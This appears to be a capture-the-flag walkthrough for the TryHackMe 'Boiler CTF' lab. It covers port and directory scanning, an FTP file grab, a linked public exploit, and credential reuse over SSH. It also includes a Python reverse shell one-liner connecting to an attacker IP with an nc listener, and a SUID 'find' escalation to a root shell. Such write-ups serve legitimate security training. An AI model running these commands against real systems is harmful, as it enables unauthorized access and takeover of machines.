# Boiler CTF

**Room Link:** [https://tryhackme.com/room/boilerctf2](https://tryhackme.com/room/boilerctf2)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/21 - HTTP

**Kali**

```
ftp $VICTIM
ls -lah 
get .info.txt
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM/joomla -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Initial Shell**

**Exploit:** [https://www.exploit-db.com/exploits/47204](https://www.exploit-db.com/exploits/47204)

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

**Browser command**

```
export RHOST="10.10.157.229";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

There is a file that has credentials

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It was also possible to view from the browser

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/55007 - SSH

**Kali**

```
ssh basterd@$VICTIM -p 55007
Pass: superduperp@$$
```

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>



There is a backup.sh script that is owned by user stoner, which has his credentials.

<figure><img src="../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh stoner@$VICTIM -p 55007                                            
Pass: superduperp@$$no1knows 
```

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

We can exploit SUID for the find command

**Exploit:** [https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)

**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
```

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Had to specify the full path, it doesn't work if you don't

**Victim**

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>





